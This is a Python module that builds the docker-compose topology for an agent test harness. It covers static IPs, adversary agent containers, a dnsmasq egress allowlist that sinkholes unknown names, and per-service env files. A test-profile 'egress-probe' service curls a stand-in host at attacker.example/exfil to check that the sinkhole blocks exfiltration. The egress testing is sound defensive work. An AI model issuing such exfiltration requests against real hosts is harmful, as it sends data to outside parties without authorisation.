"""Compose topology: the single source for docker-compose.yml, static IPs, vendor hostnames,
the egress DNS allowlist and the IP -> identity map (ADR-0034, ADR-0035).

`compose_document()` renders docker-compose.yml (committed; a unit test fails on drift);
`dnsmasq_conf()` renders the egress resolver config; `ip_identities()` maps container IPs to
agent_ids (agents) or service names (everything else) for sinkhole attribution.
"""

from dataclasses import dataclass, field
from typing import Any

from bourse.agents.catalog import agent_specs
from bourse.agents.pii_precise.isolation import CREWAI_ENV
from bourse.config import get_settings
from bourse.mcp_servers.common import SERVER_PORTS
from bourse.registry.service import make_agent_id

SUBNET = "172.30.55.0/24"
PREFIX = "172.30.55."
INTERNAL = "bourse_internal"
HOST_NET = "bourse_host"
IMAGE = "bourse:local"
EGRESS_DNS_IP = PREFIX + "40"
SINKHOLE_IP = PREFIX + "41"
ENV_DIR = "data/run/env"
REGISTRY_PORT = 55300
# Compose mode is its own deployment: same Postgres container, separate database, so agents
# register fresh (PENDING) and are admitted by exam; host mode keeps "bourse" (ADR-0034).
COMPOSE_DB = "bourse_compose"
METER_PORT = 55200
APPROVER_PORT = 55310
# Services allowed on bourse_host (ADR-0048). Agents / adversaries / MCP stay internal-only.
HOST_NET_SERVICES = frozenset(
    {
        "approver",  # Slack Socket Mode (default Docker DNS; first-party code)
        "meter",  # Ollama via host.docker.internal
        "registry",  # published port for host CLI
        "postgres",  # published port
        "jaeger",  # published port
        "otel-collector",
    }
)


@dataclass(frozen=True)
class Node:
    name: str  # compose service name
    ip: str
    identity: str  # agent_id for agents, service name otherwise
    command: list[str] = field(default_factory=list)
    aliases: tuple[str, ...] = ()
    host_net: bool = False  # also attached to bourse_host
    egress_dns: bool = False  # resolver = egress-dns (agents, MCP, broker, probes)
    ports: tuple[str, ...] = ()
    volumes: tuple[str, ...] = ()
    profile: str | None = None
    agent: str | None = None  # catalog agent name
    vendor: str | None = None
    port: int | None = None
    health_url: str | None = None


def agent_hostname(name: str, vendor_domain: str) -> str:
    return f"{name.replace('_', '-')}.{vendor_domain}"


def adversary_nodes() -> list[Node]:
    from bourse.adversaries.catalog import (
        ADVERSARIES,
        CARD_ATTACKS_NAME,
        VENDOR,
        adversary_specs,
    )

    specs = adversary_specs("small")
    out: list[Node] = []
    for i, adv in enumerate(ADVERSARIES):
        spec = specs[adv.name]
        host = agent_hostname(adv.name, VENDOR)
        out.append(
            Node(
                name=f"agent-{adv.name}",
                ip=PREFIX + str(80 + i),
                identity=make_agent_id(spec.display_name, VENDOR),
                command=["bourse", "adversary", "serve", adv.name],
                aliases=(host,),
                egress_dns=True,
                volumes=(f"./data/keys/{VENDOR}:/app/data/keys/{VENDOR}:ro",),
                profile="adversaries",
                agent=adv.name,
                vendor=VENDOR,
                port=spec.port,
                health_url=f"http://127.0.0.1:{spec.port}/.well-known/agent-card.json",
            )
        )
    from bourse.adversaries.catalog import ATTACK_CARD_HOSTS

    # Host aliases so registry can fetch each attack at /.well-known/agent-card.json.
    attack_hosts = tuple(f"{p}.{VENDOR}" for p in ATTACK_CARD_HOSTS)
    out.append(
        Node(
            name=CARD_ATTACKS_NAME,
            ip=PREFIX + str(80 + len(ADVERSARIES)),
            identity=CARD_ATTACKS_NAME,
            command=["bourse", "adversary", "serve", CARD_ATTACKS_NAME],
            aliases=(agent_hostname("card-attacks", VENDOR), *attack_hosts),
            egress_dns=True,
            volumes=(f"./data/keys/{VENDOR}:/app/data/keys/{VENDOR}:ro",),
            profile="adversaries",
            port=55520,
            health_url="http://127.0.0.1:55520/.well-known/agent-card.json",
        )
    )
    return out


def agent_nodes() -> list[Node]:
    out = []
    for i, (name, spec) in enumerate(agent_specs("large", "small").items()):
        host = agent_hostname(name, spec.vendor_domain)
        out.append(
            Node(
                name=f"agent-{name.replace('_', '-')}",
                ip=PREFIX + str(51 + i),
                identity=make_agent_id(spec.display_name, spec.vendor_domain),
                command=["bourse", "agent", "serve", name],
                aliases=(host,),
                egress_dns=True,
                # Only this vendor's key directory, read-only (ADR-0034).
                volumes=(
                    f"./data/keys/{spec.vendor_domain}:/app/data/keys/{spec.vendor_domain}:ro",
                ),
                agent=name,
                vendor=spec.vendor_domain,
                port=spec.port,
                health_url=f"http://127.0.0.1:{spec.port}/.well-known/agent-card.json",
            )
        )
    return out


def nodes() -> list[Node]:
    mcp = [
        Node(
            name=f"mcp-{n}",
            ip=PREFIX + str(31 + i),
            identity=f"mcp-{n}",
            command=["bourse", "mcp", "serve", n, "--port", str(p)],
            egress_dns=True,
            port=p,
            health_url=f"http://127.0.0.1:{p}/mcp",
        )
        for i, (n, p) in enumerate(SERVER_PORTS.items())
    ]
    return [
        Node("postgres", PREFIX + "10", "postgres", host_net=True),
        Node("otel-collector", PREFIX + "11", "otel-collector", host_net=True),
        Node("jaeger", PREFIX + "12", "jaeger", host_net=True),
        Node(
            "migrate",
            PREFIX + "19",
            "migrate",
            command=["sh", "-c", "bourse db ensure && alembic upgrade head"],
        ),
        Node(
            "registry",
            PREFIX + "20",
            "registry",
            command=["bourse", "registry", "serve", "--port", str(REGISTRY_PORT)],
            host_net=True,
            ports=(f"127.0.0.1:{REGISTRY_PORT}:{REGISTRY_PORT}",),
            port=REGISTRY_PORT,
            health_url=f"http://127.0.0.1:{REGISTRY_PORT}/agents",
        ),
        Node(
            "meter",
            PREFIX + "21",
            "meter",
            command=["bourse", "meter", "serve", "--port", str(METER_PORT)],
            host_net=True,  # the only service that reaches host.docker.internal:11434
            port=METER_PORT,
            health_url=f"http://127.0.0.1:{METER_PORT}/v1/chat/completions",
        ),
        Node(
            "approver",
            PREFIX + "22",
            "approver",
            command=["bourse", "approver", "serve", "--port", str(APPROVER_PORT)],
            # bourse_host for Slack TCP; Docker default DNS (not egress-dns) — ADR-0048.
            host_net=True,
            ports=(f"127.0.0.1:{APPROVER_PORT}:{APPROVER_PORT}",),
            port=APPROVER_PORT,
            # /healthz returns 200 only when slack == connected (ADR-0048).
            health_url=f"http://127.0.0.1:{APPROVER_PORT}/healthz",
        ),
        *mcp,
        Node(
            "egress-dns",
            EGRESS_DNS_IP,
            "egress-dns",
            command=[
                "sh",
                "-c",
                # Brace group: write conf fully, THEN background dns-watch and exec dnsmasq.
                # Without braces, `A && B && C & exec D` backgrounds the whole AND-list so
                # dnsmasq can start on a truncated conf (reads /etc/resolv.conf, no sinkhole).
                "bourse egress dnsmasq-config > /tmp/dnsmasq.conf"
                " && touch /tmp/dnsmasq.query.log"
                " && { bourse egress dns-watch /tmp/dnsmasq.query.log &"
                " exec dnsmasq --conf-file=/tmp/dnsmasq.conf --keep-in-foreground"
                " --log-queries --log-facility=/tmp/dnsmasq.query.log; }",
            ],
        ),
        Node("sinkhole", SINKHOLE_IP, "sinkhole", command=["bourse", "egress", "sinkhole"]),
        *agent_nodes(),
        *adversary_nodes(),
        Node(
            "broker",
            PREFIX + "60",
            "broker",
            command=["bourse", "--help"],
            egress_dns=True,
            volumes=("./data:/app/data",),
            profile="tools",
        ),
        Node(
            "egress-probe",
            PREFIX + "70",
            "egress-probe",
            command=[
                "sh",
                "-c",
                "curl -s -m 5 http://attacker.example/exfil?probe=1;"
                " curl -sk -m 5 https://attacker.example/; exit 0",
            ],
            egress_dns=True,
            profile="test",
        ),
    ]


def ip_identities() -> dict[str, str]:
    return {n.ip: n.identity for n in nodes()}


def agent_ids_by_ip() -> dict[str, str]:
    return {n.ip: n.identity for n in nodes() if n.agent is not None}


def allowlisted_names() -> list[str]:
    """Names the egress resolver forwards to Docker DNS; everything else -> sinkhole."""
    names: set[str] = set()
    for n in nodes():
        names.add(n.name)
        names.update(n.aliases)
    return sorted(names)


def dnsmasq_conf() -> str:
    lines = [
        "# Generated by `bourse egress dnsmasq-config` from bourse.stack.topology (ADR-0035).",
        "no-resolv",
        "no-hosts",
        "log-queries",
        f"listen-address={EGRESS_DNS_IP}",
        "listen-address=127.0.0.1",  # healthcheck queries localhost:53
        "bind-interfaces",
    ]
    lines += [f"server=/{name}/127.0.0.11" for name in allowlisted_names()]
    # No Slack forwarders here: approver uses Docker default DNS on bourse_host (ADR-0048).
    lines.append(f"address=/#/{SINKHOLE_IP}")
    return "\n".join(lines) + "\n"


def agent_card_url(agent: str) -> str:
    node = next(n for n in agent_nodes() if n.agent == agent)
    return f"http://{node.aliases[0]}:{node.port}/.well-known/agent-card.json"


def _healthcheck(url: str) -> dict[str, Any]:
    return {
        "test": ["CMD", "bourse", "healthcheck", url],
        "interval": "5s",
        "timeout": "5s",
        "retries": 30,
        "start_period": "10s",
    }


def _bourse_service(n: Node) -> dict[str, Any]:
    svc: dict[str, Any] = {
        "image": IMAGE,
        "build": {"context": ".", "dockerfile": "Dockerfile"},
        "command": n.command,
        "env_file": [{"path": f"{ENV_DIR}/{n.name}.env", "required": False}],
    }
    nets: dict[str, Any] = {INTERNAL: {"ipv4_address": n.ip}}
    if n.aliases:
        nets[INTERNAL]["aliases"] = list(n.aliases)
    if n.host_net:
        nets[HOST_NET] = {}
    svc["networks"] = nets
    if n.egress_dns:
        svc["dns"] = [EGRESS_DNS_IP]
    if n.ports:
        svc["ports"] = list(n.ports)
    if n.volumes:
        svc["volumes"] = list(n.volumes)
    if n.profile:
        svc["profiles"] = [n.profile]
    if n.health_url:
        svc["healthcheck"] = _healthcheck(n.health_url)
    if n.name != "migrate" and n.name not in ("egress-dns",):
        svc["depends_on"] = {"migrate": {"condition": "service_completed_successfully"}}
    if n.name == "migrate":
        svc["depends_on"] = {"postgres": {"condition": "service_healthy"}}
        svc["restart"] = "no"
    if n.name == "meter":
        svc["extra_hosts"] = ["host.docker.internal:host-gateway"]
    if n.name == "approver":
        # No egress-dns dependency: approver uses Docker default DNS on bourse_host (ADR-0048).
        svc["depends_on"] = {
            "migrate": {"condition": "service_completed_successfully"},
        }
    if n.name == "egress-dns":
        svc["user"] = "root"  # dnsmasq binds port 53
        svc["healthcheck"] = {
            "test": [
                "CMD",
                "python",
                "-c",
                (
                    "from bourse.egress.dns_log import dns_health_ok; "
                    "raise SystemExit(0 if dns_health_ok() is None else 1)"
                ),
            ],
            "interval": "5s",
            "timeout": "10s",
            "retries": 12,
            "start_period": "5s",
        }
    if n.name == "sinkhole":
        svc["sysctls"] = {"net.ipv4.ip_unprivileged_port_start": 0}  # 80/443 as non-root
    if n.agent is not None:
        svc["tmpfs"] = ["/tmp"]
        svc["depends_on"] = {
            "meter": {"condition": "service_healthy"},
            **{f"mcp-{m}": {"condition": "service_healthy"} for m in SERVER_PORTS},
        }
    if n.name in ("broker", "egress-probe"):
        svc["depends_on"] = {"egress-dns": {"condition": "service_healthy"}}
    return svc


def compose_document() -> dict[str, Any]:
    by_name = {n.name: n for n in nodes()}
    services: dict[str, Any] = {
        "postgres": {
            "image": "postgres:16",
            "environment": {
                "POSTGRES_USER": "bourse",
                "POSTGRES_PASSWORD": "bourse",
                "POSTGRES_DB": "bourse",
            },
            "ports": ["127.0.0.1:55432:5432"],
            "volumes": ["pgdata:/var/lib/postgresql/data"],
            "healthcheck": {
                "test": ["CMD-SHELL", "pg_isready -U bourse -d bourse"],
                "interval": "5s",
                "timeout": "3s",
                "retries": 10,
            },
            "networks": {INTERNAL: {"ipv4_address": by_name["postgres"].ip}, HOST_NET: {}},
        },
        "jaeger": {
            "image": "jaegertracing/all-in-one:1.62.0",
            "environment": {"COLLECTOR_OTLP_ENABLED": "true"},
            "ports": ["127.0.0.1:56686:16686"],
            "networks": {INTERNAL: {"ipv4_address": by_name["jaeger"].ip}, HOST_NET: {}},
        },
        "otel-collector": {
            "image": "otel/opentelemetry-collector-contrib:0.111.0",
            "command": ["--config=/etc/otel-collector.yaml"],
            "volumes": ["./otel-collector.yaml:/etc/otel-collector.yaml:ro"],
            "ports": ["127.0.0.1:54317:4317", "127.0.0.1:54318:4318"],
            "depends_on": ["jaeger"],
            "networks": {INTERNAL: {"ipv4_address": by_name["otel-collector"].ip}, HOST_NET: {}},
        },
    }
    for n in nodes():
        if n.name not in services:
            services[n.name] = _bourse_service(n)
    return {
        "services": services,
        "networks": {
            INTERNAL: {"internal": True, "ipam": {"config": [{"subnet": SUBNET}]}},
            HOST_NET: {},
        },
        "volumes": {"pgdata": {}},
    }


COMPOSE_HEADER = (
    "# GENERATED by `bourse stack compose-file` from src/bourse/stack/topology.py; do not edit.\n"
    "# Ollama runs on the host (AGENTS.md rule 5); only `meter` reaches it (ADR-0034).\n"
)


def env_files(
    secrets: dict[str, Any],
    *,
    model_large: str,
    model_small: str,
    ollama_num_parallel: int = 2,
    exam_deadline_by_model: str = "",
) -> dict[str, str]:
    """Per-service env files for compose mode (written under data/run/env, never committed).

    `exam_deadline_by_model` is `model=seconds,...` from probe --latency (3*p95), embedded so
    the registry container does not need a host bind of data/probe.
    """
    keys = secrets["meter_keys"]
    all_keys = ",".join(f"{a}:{k}" for a, k in keys.items())
    db = f"postgresql+psycopg://bourse:bourse@postgres:5432/{COMPOSE_DB}"
    common = {
        "BOURSE_DATABASE_URL": db,
        "OTEL_EXPORTER_OTLP_ENDPOINT": "http://otel-collector:4317",
        "BOURSE_BIND_HOST": "0.0.0.0",
        "BOURSE_REGISTRY_URL": f"http://registry:{REGISTRY_PORT}",
        "BOURSE_METER_URL": f"http://meter:{METER_PORT}",
        "BOURSE_MCP_URL_TEMPLATE": "http://mcp-{name}:{port}/mcp",
        "BOURSE_MODEL_LARGE": model_large,
        "BOURSE_MODEL_SMALL": model_small,
        "BOURSE_AGENT_LLM_TIMEOUT_S": str(get_settings().bourse_agent_llm_timeout_s),
        "BOURSE_METER_DEADLINE_S": str(get_settings().bourse_meter_deadline_s),
        "BOURSE_EXAM_DEADLINE_S": str(get_settings().bourse_exam_deadline_s),
        "BOURSE_EXAM_TIMEOUT_S": str(get_settings().bourse_exam_timeout_s),
        "BOURSE_DEV_HOSTS": "",
        "OLLAMA_NUM_PARALLEL": str(ollama_num_parallel),
        "BOURSE_IN_COMPOSE": "1",
    }
    out: dict[str, dict[str, str]] = {n.name: dict(common) for n in nodes() if n.command}
    settings = get_settings()
    approver_key = str(secrets.get("approver_key") or "")
    approver_http = {
        "BOURSE_APPROVER_URL": f"http://approver:{APPROVER_PORT}",
        "BOURSE_APPROVER_KEY": approver_key,
    }
    registry_extra = {
        "BOURSE_ADMIN_TOKEN": secrets["admin_token"],
        "BOURSE_HONEYTOKEN_SECRET": secrets["honeytoken_secret"],
        # Broker meter key: admission exams POST /budgets before each task (ADR-0041).
        "BOURSE_AGENT_KEY": keys["broker"],
        **approver_http,
    }
    if exam_deadline_by_model:
        registry_extra["BOURSE_EXAM_DEADLINE_BY_MODEL"] = exam_deadline_by_model
    out["registry"] |= registry_extra
    out["meter"] |= {
        "BOURSE_METER_KEYS": all_keys,
        "OLLAMA_BASE_URL": "http://host.docker.internal:11434",
        "OLLAMA_NUM_PARALLEL": str(ollama_num_parallel),
    }
    for m in SERVER_PORTS:
        out[f"mcp-{m}"] |= {"BOURSE_METER_KEYS": all_keys}
    out["sinkhole"] |= {"BOURSE_ADMIN_TOKEN": secrets["admin_token"]}
    if "egress-dns" in out:
        out["egress-dns"] |= {"BOURSE_ADMIN_TOKEN": secrets["admin_token"]}
    out["broker"] |= {
        "BOURSE_ADMIN_TOKEN": secrets["admin_token"],
        "BOURSE_HONEYTOKEN_SECRET": secrets["honeytoken_secret"],
        "BOURSE_OLLAMA_PS_URL": f"http://meter:{METER_PORT}/ollama/api/ps",
        "BOURSE_OLLAMA_PS_KEY": keys["broker"],
        **approver_http,
    }
    # Approver is the only service with Slack tokens (Socket Mode over bourse_host).
    if "approver" in out:
        out["approver"] |= {
            "SLACK_BOT_TOKEN": settings.slack_bot_token.get_secret_value(),
            "SLACK_APP_TOKEN": settings.slack_app_token.get_secret_value(),
            "SLACK_CHANNEL_ID": settings.slack_channel_id.strip(),
            "BOURSE_SLACK_APPROVERS": settings.bourse_slack_approvers.strip(),
            "BOURSE_SLACK_TIMEOUT_S": str(settings.bourse_slack_timeout_s),
            "BOURSE_APPROVER_KEY": approver_key,
        }
    for n in [*agent_nodes(), *adversary_nodes()]:
        if n.agent is None:
            if n.name == "card-attacks":
                out[n.name] = out[n.name] | {
                    "BOURSE_AGENT_BASE_URL": f"http://{n.aliases[0]}:{n.port}",
                }
            continue
        env = out[n.name] | {
            "BOURSE_AGENT_KEY": keys[n.agent],
            "BOURSE_AGENT_BASE_URL": f"http://{n.aliases[0]}:{n.port}",
            "HOME": "/tmp",
        }
        if n.agent == "pii_precise":
            env |= CREWAI_ENV
        out[n.name] = env
    return {name: "".join(f"{k}={v}\n" for k, v in env.items()) for name, env in out.items()}
